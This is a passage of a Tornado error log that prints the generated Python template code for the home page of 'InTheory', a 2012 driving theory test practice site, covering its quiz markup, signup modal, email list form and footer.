231      _tmp = kwargs["questions"][5].options[0]  # home.html:21 (via base.html:76)
232      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # home.html:21 (via base.html:76)
233      else: _tmp = _utf8(str(_tmp))  # home.html:21 (via base.html:76)
234      _tmp = _utf8(xhtml_escape(_tmp))  # home.html:21 (via base.html:76)
235      _append(_tmp)  # home.html:21 (via base.html:76)
236      _append('", "')  # home.html:21 (via base.html:76)
237      _tmp = kwargs["questions"][5].options[1]  # home.html:21 (via base.html:76)
238      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # home.html:21 (via base.html:76)
239      else: _tmp = _utf8(str(_tmp))  # home.html:21 (via base.html:76)
240      _tmp = _utf8(xhtml_escape(_tmp))  # home.html:21 (via base.html:76)
241      _append(_tmp)  # home.html:21 (via base.html:76)
242      _append('", "')  # home.html:21 (via base.html:76)
243      _tmp = kwargs["questions"][5].options[2]  # home.html:21 (via base.html:76)
244      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # home.html:21 (via base.html:76)
245      else: _tmp = _utf8(str(_tmp))  # home.html:21 (via base.html:76)
246      _tmp = _utf8(xhtml_escape(_tmp))  # home.html:21 (via base.html:76)
247      _append(_tmp)  # home.html:21 (via base.html:76)
248      _append('", "')  # home.html:21 (via base.html:76)
249      _tmp = kwargs["questions"][5].options[3]  # home.html:21 (via base.html:76)
250      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # home.html:21 (via base.html:76)
251      else: _tmp = _utf8(str(_tmp))  # home.html:21 (via base.html:76)
252      _tmp = _utf8(xhtml_escape(_tmp))  # home.html:21 (via base.html:76)
253      _append(_tmp)  # home.html:21 (via base.html:76)
254      _append('"],"answer": ')  # home.html:21 (via base.html:76)
255      _tmp = kwargs["questions"][5].answer  # home.html:21 (via base.html:76)
256      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # home.html:21 (via base.html:76)
257      else: _tmp = _utf8(str(_tmp))  # home.html:21 (via base.html:76)
258      _tmp = _utf8(xhtml_escape(_tmp))  # home.html:21 (via base.html:76)
259      _append(_tmp)  # home.html:21 (via base.html:76)
260      _append('}, { "question":"')  # home.html:21 (via base.html:76)
261      _tmp = kwargs["questions"][6].question  # home.html:21 (via base.html:76)
262      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # home.html:21 (via base.html:76)
263      else: _tmp = _utf8(str(_tmp))  # home.html:21 (via base.html:76)
264      _tmp = _utf8(xhtml_escape(_tmp))  # home.html:21 (via base.html:76)
265      _append(_tmp)  # home.html:21 (via base.html:76)
266      _append('","options": ["')  # home.html:21 (via base.html:76)
267      _tmp = kwargs["questions"][6].options[0]  # home.html:21 (via base.html:76)
268      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # home.html:21 (via base.html:76)
269      else: _tmp = _utf8(str(_tmp))  # home.html:21 (via base.html:76)
270      _tmp = _utf8(xhtml_escape(_tmp))  # home.html:21 (via base.html:76)
271      _append(_tmp)  # home.html:21 (via base.html:76)
272      _append('", "')  # home.html:21 (via base.html:76)
273      _tmp = kwargs["questions"][6].options[1]  # home.html:21 (via base.html:76)
274      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # home.html:21 (via base.html:76)
275      else: _tmp = _utf8(str(_tmp))  # home.html:21 (via base.html:76)
276      _tmp = _utf8(xhtml_escape(_tmp))  # home.html:21 (via base.html:76)
277      _append(_tmp)  # home.html:21 (via base.html:76)
278      _append('", "')  # home.html:21 (via base.html:76)
279      _tmp = kwargs["questions"][6].options[2]  # home.html:21 (via base.html:76)
280      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # home.html:21 (via base.html:76)
281      else: _tmp = _utf8(str(_tmp))  # home.html:21 (via base.html:76)
282      _tmp = _utf8(xhtml_escape(_tmp))  # home.html:21 (via base.html:76)
283      _append(_tmp)  # home.html:21 (via base.html:76)
284      _append('", "')  # home.html:21 (via base.html:76)
285      _tmp = kwargs["questions"][6].options[3]  # home.html:21 (via base.html:76)
286      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # home.html:21 (via base.html:76)
287      else: _tmp = _utf8(str(_tmp))  # home.html:21 (via base.html:76)
288      _tmp = _utf8(xhtml_escape(_tmp))  # home.html:21 (via base.html:76)
289      _append(_tmp)  # home.html:21 (via base.html:76)
290      _append('"],"answer": ')  # home.html:21 (via base.html:76)
291      _tmp = kwargs["questions"][6].answer  # home.html:21 (via base.html:76)
292      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # home.html:21 (via base.html:76)
293      else: _tmp = _utf8(str(_tmp))  # home.html:21 (via base.html:76)
294      _tmp = _utf8(xhtml_escape(_tmp))  # home.html:21 (via base.html:76)
295      _append(_tmp)  # home.html:21 (via base.html:76)
296      _append('},{ "question":"')  # home.html:21 (via base.html:76)
297      _tmp = kwargs["questions"][7].question  # home.html:21 (via base.html:76)
298      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # home.html:21 (via base.html:76)
299      else: _tmp = _utf8(str(_tmp))  # home.html:21 (via base.html:76)
300      _tmp = _utf8(xhtml_escape(_tmp))  # home.html:21 (via base.html:76)
301      _append(_tmp)  # home.html:21 (via base.html:76)
302      _append('","options": ["')  # home.html:21 (via base.html:76)
303      _tmp = kwargs["questions"][7].options[0]  # home.html:21 (via base.html:76)
304      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # home.html:21 (via base.html:76)
305      else: _tmp = _utf8(str(_tmp))  # home.html:21 (via base.html:76)
306      _tmp = _utf8(xhtml_escape(_tmp))  # home.html:21 (via base.html:76)
307      _append(_tmp)  # home.html:21 (via base.html:76)
308      _append('", "')  # home.html:21 (via base.html:76)
309      _tmp = kwargs["questions"][7].options[1]  # home.html:21 (via base.html:76)
310      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # home.html:21 (via base.html:76)
311      else: _tmp = _utf8(str(_tmp))  # home.html:21 (via base.html:76)
312      _tmp = _utf8(xhtml_escape(_tmp))  # home.html:21 (via base.html:76)
313      _append(_tmp)  # home.html:21 (via base.html:76)
314      _append('", "')  # home.html:21 (via base.html:76)
315      _tmp = kwargs["questions"][7].options[2]  # home.html:21 (via base.html:76)
316      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # home.html:21 (via base.html:76)
317      else: _tmp = _utf8(str(_tmp))  # home.html:21 (via base.html:76)
318      _tmp = _utf8(xhtml_escape(_tmp))  # home.html:21 (via base.html:76)
319      _append(_tmp)  # home.html:21 (via base.html:76)
320      _append('", "')  # home.html:21 (via base.html:76)
321      _tmp = kwargs["questions"][7].options[3]  # home.html:21 (via base.html:76)
322      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # home.html:21 (via base.html:76)
323      else: _tmp = _utf8(str(_tmp))  # home.html:21 (via base.html:76)
324      _tmp = _utf8(xhtml_escape(_tmp))  # home.html:21 (via base.html:76)
325      _append(_tmp)  # home.html:21 (via base.html:76)
326      _append('"],"answer": ')  # home.html:21 (via base.html:76)
327      _tmp = kwargs["questions"][7].answer  # home.html:21 (via base.html:76)
328      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # home.html:21 (via base.html:76)
329      else: _tmp = _utf8(str(_tmp))  # home.html:21 (via base.html:76)
330      _tmp = _utf8(xhtml_escape(_tmp))  # home.html:21 (via base.html:76)
331      _append(_tmp)  # home.html:21 (via base.html:76)
332      _append('}, { "question":"')  # home.html:21 (via base.html:76)
333      _tmp = kwargs["questions"][8].question  # home.html:21 (via base.html:76)
334      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # home.html:21 (via base.html:76)
335      else: _tmp = _utf8(str(_tmp))  # home.html:21 (via base.html:76)
336      _tmp = _utf8(xhtml_escape(_tmp))  # home.html:21 (via base.html:76)
337      _append(_tmp)  # home.html:21 (via base.html:76)
338      _append('","options": ["')  # home.html:21 (via base.html:76)
339      _tmp = kwargs["questions"][8].options[0]  # home.html:21 (via base.html:76)
340      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # home.html:21 (via base.html:76)
341      else: _tmp = _utf8(str(_tmp))  # home.html:21 (via base.html:76)
342      _tmp = _utf8(xhtml_escape(_tmp))  # home.html:21 (via base.html:76)
343      _append(_tmp)  # home.html:21 (via base.html:76)
344      _append('", "')  # home.html:21 (via base.html:76)
345      _tmp = kwargs["questions"][8].options[1]  # home.html:21 (via base.html:76)
346      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # home.html:21 (via base.html:76)
347      else: _tmp = _utf8(str(_tmp))  # home.html:21 (via base.html:76)
348      _tmp = _utf8(xhtml_escape(_tmp))  # home.html:21 (via base.html:76)
349      _append(_tmp)  # home.html:21 (via base.html:76)
350      _append('", "')  # home.html:21 (via base.html:76)
351      _tmp = kwargs["questions"][8].options[2]  # home.html:21 (via base.html:76)
352      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # home.html:21 (via base.html:76)
353      else: _tmp = _utf8(str(_tmp))  # home.html:21 (via base.html:76)
354      _tmp = _utf8(xhtml_escape(_tmp))  # home.html:21 (via base.html:76)
355      _append(_tmp)  # home.html:21 (via base.html:76)
356      _append('", "')  # home.html:21 (via base.html:76)
357      _tmp = kwargs["questions"][8].options[3]  # home.html:21 (via base.html:76)
358      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # home.html:21 (via base.html:76)
359      else: _tmp = _utf8(str(_tmp))  # home.html:21 (via base.html:76)
360      _tmp = _utf8(xhtml_escape(_tmp))  # home.html:21 (via base.html:76)
361      _append(_tmp)  # home.html:21 (via base.html:76)
362      _append('"],"answer": ')  # home.html:21 (via base.html:76)
363      _tmp = kwargs["questions"][8].answer  # home.html:21 (via base.html:76)
364      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # home.html:21 (via base.html:76)
365      else: _tmp = _utf8(str(_tmp))  # home.html:21 (via base.html:76)
366      _tmp = _utf8(xhtml_escape(_tmp))  # home.html:21 (via base.html:76)
367      _append(_tmp)  # home.html:21 (via base.html:76)
368      _append('},{ "question":"')  # home.html:21 (via base.html:76)
369      _tmp = kwargs["questions"][9].question  # home.html:21 (via base.html:76)
370      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # home.html:21 (via base.html:76)
371      else: _tmp = _utf8(str(_tmp))  # home.html:21 (via base.html:76)
372      _tmp = _utf8(xhtml_escape(_tmp))  # home.html:21 (via base.html:76)
373      _append(_tmp)  # home.html:21 (via base.html:76)
374      _append('","options": ["')  # home.html:21 (via base.html:76)
375      _tmp = kwargs["questions"][9].options[0]  # home.html:21 (via base.html:76)
376      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # home.html:21 (via base.html:76)
377      else: _tmp = _utf8(str(_tmp))  # home.html:21 (via base.html:76)
378      _tmp = _utf8(xhtml_escape(_tmp))  # home.html:21 (via base.html:76)
379      _append(_tmp)  # home.html:21 (via base.html:76)
380      _append('", "')  # home.html:21 (via base.html:76)
381      _tmp = kwargs["questions"][9].options[1]  # home.html:21 (via base.html:76)
382      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # home.html:21 (via base.html:76)
383      else: _tmp = _utf8(str(_tmp))  # home.html:21 (via base.html:76)
384      _tmp = _utf8(xhtml_escape(_tmp))  # home.html:21 (via base.html:76)
385      _append(_tmp)  # home.html:21 (via base.html:76)
386      _append('", "')  # home.html:21 (via base.html:76)
387      _tmp = kwargs["questions"][9].options[2]  # home.html:21 (via base.html:76)
388      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # home.html:21 (via base.html:76)
389      else: _tmp = _utf8(str(_tmp))  # home.html:21 (via base.html:76)
390      _tmp = _utf8(xhtml_escape(_tmp))  # home.html:21 (via base.html:76)
391      _append(_tmp)  # home.html:21 (via base.html:76)
392      _append('", "')  # home.html:21 (via base.html:76)
393      _tmp = kwargs["questions"][9].options[3]  # home.html:21 (via base.html:76)
394      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # home.html:21 (via base.html:76)
395      else: _tmp = _utf8(str(_tmp))  # home.html:21 (via base.html:76)
396      _tmp = _utf8(xhtml_escape(_tmp))  # home.html:21 (via base.html:76)
397      _append(_tmp)  # home.html:21 (via base.html:76)
398      _append('"],"answer": ')  # home.html:21 (via base.html:76)
399      _tmp = kwargs["questions"][9].answer  # home.html:21 (via base.html:76)
400      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # home.html:21 (via base.html:76)
401      else: _tmp = _utf8(str(_tmp))  # home.html:21 (via base.html:76)
402      _tmp = _utf8(xhtml_escape(_tmp))  # home.html:21 (via base.html:76)
403      _append(_tmp)  # home.html:21 (via base.html:76)
404      _append('}]\'>\n</div>\n<div id="answers" data-answers=\'[]\'></div>\n<div id="mini-quiz-box" class="undimmed">\n')  # home.html:25 (via base.html:76)
405      question = kwargs['questions'][0]  # home.html:25 (via base.html:76)
406      _append('\n<h4> ')  # home.html:26 (via base.html:76)
407      _tmp = question.question  # home.html:26 (via base.html:76)
408      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # home.html:26 (via base.html:76)
409      else: _tmp = _utf8(str(_tmp))  # home.html:26 (via base.html:76)
410      _tmp = _utf8(xhtml_escape(_tmp))  # home.html:26 (via base.html:76)
411      _append(_tmp)  # home.html:26 (via base.html:76)
412      _append('</h4>\n<ul remaining-answers=')  # home.html:27 (via base.html:76)
413      _tmp = len(question.answer)  # home.html:27 (via base.html:76)
414      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # home.html:27 (via base.html:76)
415      else: _tmp = _utf8(str(_tmp))  # home.html:27 (via base.html:76)
416      _tmp = _utf8(xhtml_escape(_tmp))  # home.html:27 (via base.html:76)
417      _append(_tmp)  # home.html:27 (via base.html:76)
418      _append(' class="nav nav-pills nav-stacked">\n<li><a class="choice" ind="0"><span class="badge badge-info">A</span> ')  # home.html:28 (via base.html:76)
419      _tmp = question.options[0]  # home.html:28 (via base.html:76)
420      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # home.html:28 (via base.html:76)
421      else: _tmp = _utf8(str(_tmp))  # home.html:28 (via base.html:76)
422      _tmp = _utf8(xhtml_escape(_tmp))  # home.html:28 (via base.html:76)
423      _append(_tmp)  # home.html:28 (via base.html:76)
424      _append('</a></li>\n<li><a class="choice" ind="1"><span class="badge badge-info">B</span> ')  # home.html:29 (via base.html:76)
425      _tmp = question.options[1]  # home.html:29 (via base.html:76)
426      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # home.html:29 (via base.html:76)
427      else: _tmp = _utf8(str(_tmp))  # home.html:29 (via base.html:76)
428      _tmp = _utf8(xhtml_escape(_tmp))  # home.html:29 (via base.html:76)
429      _append(_tmp)  # home.html:29 (via base.html:76)
430      _append('</a></li>\n<li><a class="choice" ind="2"><span class="badge badge-info">C</span> ')  # home.html:30 (via base.html:76)
431      _tmp = question.options[2]  # home.html:30 (via base.html:76)
432      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # home.html:30 (via base.html:76)
433      else: _tmp = _utf8(str(_tmp))  # home.html:30 (via base.html:76)
434      _tmp = _utf8(xhtml_escape(_tmp))  # home.html:30 (via base.html:76)
435      _append(_tmp)  # home.html:30 (via base.html:76)
436      _append('</a></li>\n<li><a class="choice" ind="3"><span class="badge badge-info">D</span> ')  # home.html:31 (via base.html:76)
437      _tmp = question.options[3]  # home.html:31 (via base.html:76)
438      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # home.html:31 (via base.html:76)
439      else: _tmp = _utf8(str(_tmp))  # home.html:31 (via base.html:76)
440      _tmp = _utf8(xhtml_escape(_tmp))  # home.html:31 (via base.html:76)
441      _append(_tmp)  # home.html:31 (via base.html:76)
442      _append('</a></li>\n</ul>\n<a id="next" class="btn btn-success btn-mini disabled">Next Question</a>\n</div>\n</div>\n</div>\n</div>\n</div>\n<div class="row">\n<div class="span10">\n</div>\n<div class="span5 offset5">\n</br></br>\n<blockquote>\n<p>\n<h2><div class="funkytext"><font color="#ffffff">"')  # home.html:47 (via base.html:76)
443      _tmp = kwargs['tweet']  # home.html:47 (via base.html:76)
444      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # home.html:47 (via base.html:76)
445      else: _tmp = _utf8(str(_tmp))  # home.html:47 (via base.html:76)
446      _tmp = _utf8(xhtml_escape(_tmp))  # home.html:47 (via base.html:76)
447      _append(_tmp)  # home.html:47 (via base.html:76)
448      _append('"</h2>\n<div class="funkytext">- Dave Mason, London</font></div>\n</p>\n</blockquote>\n</div>\n</div>\n</div> <!-- /container -->\n<div id="dim">\n</div>\n')  # home.html:57 (via base.html:76)
449      _append('\n')  # base.html:80
450      _tmp = xsrf_form_html()  # base.html:80
451      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # base.html:80
452      else: _tmp = _utf8(str(_tmp))  # base.html:80
453      _append(_tmp)  # base.html:80
454      _append('\n')  # base.html:81
455      _append('\n<script src="')  # base.html:82 (via base.html:81)
456      _tmp = static_url('js/libs/jquery-1.7.2.min.js')  # base.html:82 (via base.html:81)
457      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # base.html:82 (via base.html:81)
458      else: _tmp = _utf8(str(_tmp))  # base.html:82 (via base.html:81)
459      _tmp = _utf8(xhtml_escape(_tmp))  # base.html:82 (via base.html:81)
460      _append(_tmp)  # base.html:82 (via base.html:81)
461      _append('"></script>\n<script src="')  # base.html:83 (via base.html:81)
462      _tmp = static_url('js/libs/blurb.min.js')  # base.html:83 (via base.html:81)
463      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # base.html:83 (via base.html:81)
464      else: _tmp = _utf8(str(_tmp))  # base.html:83 (via base.html:81)
465      _tmp = _utf8(xhtml_escape(_tmp))  # base.html:83 (via base.html:81)
466      _append(_tmp)  # base.html:83 (via base.html:81)
467      _append('"></script>\n<script src="')  # base.html:84 (via base.html:81)
468      _tmp = static_url('js/IT.js')  # base.html:84 (via base.html:81)
469      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # base.html:84 (via base.html:81)
470      else: _tmp = _utf8(str(_tmp))  # base.html:84 (via base.html:81)
471      _tmp = _utf8(xhtml_escape(_tmp))  # base.html:84 (via base.html:81)
472      _append(_tmp)  # base.html:84 (via base.html:81)
473      _append('"></script>\n<script type="text/javascript" src="http://twitter.github.com/bootstrap/assets/js/bootstrap-dropdown.js"></script>\n<script type="text/javascript" src="http://twitter.github.com/bootstrap/assets/js/bootstrap-button.js"></script>\n<script type="text/javascript" src="http://twitter.github.com/bootstrap/assets/js/bootstrap-modal.js"></script>\n')  # base.html:88 (via base.html:81)
474      _append('\n')  # base.html:90
475      for js in kwargs['js_deps']:  # base.html:90
476          _append('\n<script src="')  # base.html:91
477          _tmp = static_url(js)  # base.html:91
478          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # base.html:91
479          else: _tmp = _utf8(str(_tmp))  # base.html:91
480          _tmp = _utf8(xhtml_escape(_tmp))  # base.html:91
481          _append(_tmp)  # base.html:91
482          _append('"></script>\n')  # base.html:92
483      _append('\n')  # base.html:94
484      _append('\n<script id="signup-template" type="text/x-jquery-tmpl">\n<div id="windowTitleDialog" class="modal hide fade">\n<div class="modal-header">\n<a class="close">&times;</a>\n<h3>You scored ${score} out of 10!</h3>\n</div>\n<div class="modal-body">\n<p>You still need a little practice, but don\'t worry we\'re here to help you pass. Sign-up today to get started...</p>\n<a href="/login"><center><img src="')  # home.html:68 (via base.html:94)
485      _tmp = static_url('imgs/facebook.png')  # home.html:68 (via base.html:94)
486      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # home.html:68 (via base.html:94)
487      else: _tmp = _utf8(str(_tmp))  # home.html:68 (via base.html:94)
488      _tmp = _utf8(xhtml_escape(_tmp))  # home.html:68 (via base.html:94)
489      _append(_tmp)  # home.html:68 (via base.html:94)
490      _append('" alt="some_text"/></a>\n<img src="')  # home.html:69 (via base.html:94)
491      _tmp = static_url('imgs/twitter.png')  # home.html:69 (via base.html:94)
492      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # home.html:69 (via base.html:94)
493      else: _tmp = _utf8(str(_tmp))  # home.html:69 (via base.html:94)
494      _tmp = _utf8(xhtml_escape(_tmp))  # home.html:69 (via base.html:94)
495      _append(_tmp)  # home.html:69 (via base.html:94)
496      _append('" alt="some_text"/>\n<img src="')  # home.html:70 (via base.html:94)
497      _tmp = static_url('imgs/google.png')  # home.html:70 (via base.html:94)
498      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # home.html:70 (via base.html:94)
499      else: _tmp = _utf8(str(_tmp))  # home.html:70 (via base.html:94)
500      _tmp = _utf8(xhtml_escape(_tmp))  # home.html:70 (via base.html:94)
501      _append(_tmp)  # home.html:70 (via base.html:94)
502      _append('" alt="some_text"/></center>\n<center><a href="h">Or click here to sign-up directly</a></center>\n</div>\n<div class="modal-footer">\n<ul class="pager">\n<li class="previous"><a href="#">Sign in to InTheory</a></li>\n<li class="next"><a href="#">Forgot username or password?</a></li>\n</ul>\n</div>\n</div>\n</script>\n<script id="show-arrow-template" type="text/x-jquery-tmpl">\n<div class="arrow-container">\n<img src="')  # home.html:84 (via base.html:94)
503      _tmp = static_url('imgs/arrow.png')  # home.html:84 (via base.html:94)
504      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # home.html:84 (via base.html:94)
505      else: _tmp = _utf8(str(_tmp))  # home.html:84 (via base.html:94)
506      _tmp = _utf8(xhtml_escape(_tmp))  # home.html:84 (via base.html:94)
507      _append(_tmp)  # home.html:84 (via base.html:94)
508      _append('"/>\n</div>\n</script>\n<script id="email-template" type="text/x-jquery-tmpl">\n<div id="windowTitleDialog" class="modal hide fade">\n<div class="modal-header">\n<a class="close">&times;</a>\n<h3>You scored ${score} out of 10!</h3>\n</div>\n<div class="modal-body">\n<center>\n<p>Leave your email and we\'ll let you know when we launch!</p>\n<form method="post" class="af-form-wrapper" action="http://www.aweber.com/scripts/addlead.pl" >\n<div style="display: none;">\n<input type="hidden" name="meta_web_form_id" value="677441365" />\n<input type="hidden" name="meta_split_id" value="" />\n<input type="hidden" name="listname" value="intheory" />\n<input type="hidden" name="redirect" value="http://www.aweber.com/thankyou-coi.htm?m=video" id="redirect_b3be9783c304109a8d9d9ca013e7b651" />\n<input type="hidden" name="meta_adtracking" value="Waiting_List_/_Splash" />\n<input type="hidden" name="meta_message" value="1" />\n<input type="hidden" name="meta_required" value="name,email" />\n<input type="hidden" name="meta_tooltip" value="" />\n</div>\n<div id="af-form-677441365" class="af-form"><div id="af-body-677441365" class="af-body af-standards">\n<div class="af-element">\n<div class="af-textWrap"></br>\n<input id="awf_field-39151245" type="text" name="name" class="text" placeholder="Enter Your Name" tabindex="500" />\n</div>\n<div class="af-clear"></div></div>\n<div class="af-element">\n<div class="af-textWrap"><input class="text" id="awf_field-39151246" type="text" name="email" placeholder="Enter Your Email" tabindex="501" />\n</div><div class="af-clear"></div>\n</div>\n<input name="submit" class="btn btn-primaryw" type="submit" value="Submit" tabindex="502" />\n</br>\n<a href="/login">or connect with Facebook</a>\n</div>\n</br></br>\n<div class="af-element privacyPolicy" style="text-align: center"><p>We respect your <a title="Privacy Policy" href="http://www.aweber.com/permission.htm" target="_blank">email privacy</a></p>\n<div class="af-clear"></div>\n</div>\n</div>\n</div>\n<div style="display: none;"><img src="http://forms.aweber.com/form/displays.htm?id=bOzsLCyMzGys" alt="" /></div>\n</form>\n</center>\n<script type="text/javascript">\n<!--\n(function() {\nvar IE = /*@cc_on!@*/false;\nif (!IE) { return; }\nif (document.compatMode && document.compatMode == \'BackCompat\') {\nif (document.getElementById("af-form-677441365")) {\ndocument.getElementById("af-form-677441365").className = \'af-form af-quirksMode\';\n}\nif (document.getElementById("af-body-677441365")) {\ndocument.getElementById("af-body-677441365").className = "af-body inline af-quirksMode";\n}\nif (document.getElementById("af-header-677441365")) {\ndocument.getElementById("af-header-677441365").className = "af-header af-quirksMode";\n}\nif (document.getElementById("af-footer-677441365")) {\ndocument.getElementById("af-footer-677441365").className = "af-footer af-quirksMode";\n}\n}\n})();\n-->\n</script>\n</div>\n</div>\n</script>\n')  # home.html:158 (via base.html:94)
509      _append('\n<div class="container">\n<div class="footer"><font color="#FFFFFF" size="2px"> <p class="alignleft">InTheory Media Limited \xc2\xa9 2012</p>\n<p class="alignright">About Us | Terms & Conditions | Privacy Policy | Support </p></font></br>\n</div>\n</div>\n</body>\n</html>\n')  # base.html:106
510      return _utf8('').join(_buffer)  # base.html:0
ERROR:root:home.html code:
  1  def _execute():  # base.html:0
  2      _buffer = []  # base.html:0
  3      _append = _buffer.append  # base.html:0
  4      _append('<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN" "http://www.w3.org/TR/html4/loose.dtd">\n<!--[if lt IE 7 ]> <html lang="en" class="no-js ie6"> <![endif]-->\n<!--[if IE 7 ]> <html lang="en" class="no-js ie7"> <![endif]-->\n<!--[if IE 8 ]> <html lang="en" class="no-js ie8"> <![endif]-->\n<!--[if IE 9 ]> <html lang="en" class="no-js ie9"> <![endif]-->\n<!--[if (gt IE 9)|!(IE)]><!--> <html lang="en" class="no-js"> <!--<![endif]-->\n<head xmlns="http://www.w3.org/1999/xhtml" xmlns:fb="http://www.facebook.com/2008/fbml">\n<meta charset="utf-8">\n<meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">\n<meta name="author" content="intheory">\n<meta name="description" content="Intheory 2012">\n<meta property="og:image" content="http://www.petrominpng.com.pg/images/logo_big.png" />\n<meta name="viewport" content="width=920, initial-scale=auto">\n<meta property="og:type" content="website" />\n<meta property="og:title" content="Intheory 2012" />\n<meta property="og:site_name" content="Intheory 2012" />\n<title>\n')  # base.html:19
  5      _append('\nInTheory | Pass Your Theory Test. Guaranteed.\n')  # base.html:21 (via base.html:19)
  6      _append('\n</title>\n<link href="../static/css/bootstrap.css" rel="stylesheet">\n<link href="../static/css/bootstrap-responsive.css" rel="stylesheet">\n<link rel="stylesheet" href="')  # base.html:25
  7      _tmp = static_url('css/base.css')  # base.html:25
  8      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # base.html:25
  9      else: _tmp = _utf8(str(_tmp))  # base.html:25
 10      _tmp = _utf8(xhtml_escape(_tmp))  # base.html:25
 11      _append(_tmp)  # base.html:25
 12      _append('" />\n')  # base.html:26
 13      for css in kwargs['css_deps']:  # base.html:26
 14          _append('\n<link href="')  # base.html:27
 15          _tmp = static_url(css)  # base.html:27
 16          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # base.html:27
 17          else: _tmp = _utf8(str(_tmp))  # base.html:27
 18          _tmp = _utf8(xhtml_escape(_tmp))  # base.html:27
 19          _append(_tmp)  # base.html:27
 20          _append('" rel="stylesheet">\n')  # base.html:28
 21      _append('\n<style type="text/css">\nhtml{\nbackground-image: url(/static/imgs/background.jpg);\nbackground-repeat: no-repeat;\n}\nbody {\npadding-top: 60px;\npadding-bottom: 40px;\n}\n</style>\n</head>\n<body >\n')  # base.html:44
 22      _append('\n<div class="navbar navbar-fixed-top">\n<div class="navbar-inner">\n<div class="container">\n<a class="btn btn-navbar" data-toggle="collapse" data-target=".nav-collapse">\n<span class="icon-bar"></span>\n<span class="icon-bar"></span>\n<span class="icon-bar"></span>\n</a>\n<a class="brand" href="/"> <img src="')  # base.html:53 (via base.html:44)
 23      _tmp = static_url('imgs/logo.png')  # base.html:53 (via base.html:44)
 24      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # base.html:53 (via base.html:44)
 25      else: _tmp = _utf8(str(_tmp))  # base.html:53 (via base.html:44)
 26      _tmp = _utf8(xhtml_escape(_tmp))  # base.html:53 (via base.html:44)
 27      _append(_tmp)  # base.html:53 (via base.html:44)
 28      _append('"></a>\n<div class="pull-right">\n')  # base.html:55 (via base.html:44)
 29      if not current_user:  # base.html:55 (via base.html:44)
 30          _append('\n<a href="/login"><button type="submit" class="btn btn-success">Sign in</button></a>\n')  # base.html:57 (via base.html:44)
 31      else:  # base.html:57 (via base.html:44)
 32          _append('\n<ul class="nav nav-pills">\n')  # base.html:59 (via base.html:44)
 33          if current_user['moderator']:  # base.html:59 (via base.html:44)
 34              _append('\n<li id="admin-nav"><a href="/admin">Admin</a></li>\n')  # base.html:61 (via base.html:44)
 35          _append('\n<li class="active"><a href="/learn/main">Learn</a></li>\n<li id="mock-test-nav"><a href="/test/new">Mock Test</a></li>\n<li><a href="#">Book Test</a></li>\n<li><a href="/logout">Logout</a></li>\n<li>|</li>\n</ul>\n<a class="brand1" href="/dashboard"> <img src="')  # base.html:68 (via base.html:44)
 36          _tmp = static_url('imgs/user.png')  # base.html:68 (via base.html:44)
 37          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # base.html:68 (via base.html:44)
 38          else: _tmp = _utf8(str(_tmp))  # base.html:68 (via base.html:44)
 39          _tmp = _utf8(xhtml_escape(_tmp))  # base.html:68 (via base.html:44)
 40          _append(_tmp)  # base.html:68 (via base.html:44)
 41          _append('"></a>\n')  # base.html:69 (via base.html:44)
 42      _append('\n</div>\n</div>\n</div>\n</div>\n')  # base.html:74 (via base.html:44)
 43      _append('\n')  # base.html:76
